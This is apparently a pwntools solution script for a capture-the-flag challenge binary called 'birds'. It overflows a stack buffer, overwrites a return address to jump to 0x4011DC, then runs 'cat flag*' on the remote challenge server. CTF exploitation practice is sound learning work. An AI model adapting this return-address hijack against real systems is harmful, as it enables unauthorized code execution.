from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./birds"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("tjc.tf", 31625)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()

# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))


payload = b"a"*0x48+b"a"*0x4
payload += p64(0xDEADBEEF)
payload += p32(0)
payload += p64(0x4011DC) 

ddebug()
io.sendlineafter("Prove me wrong!", payload)
io.sendline(b"cat flag*")

io.interactive()
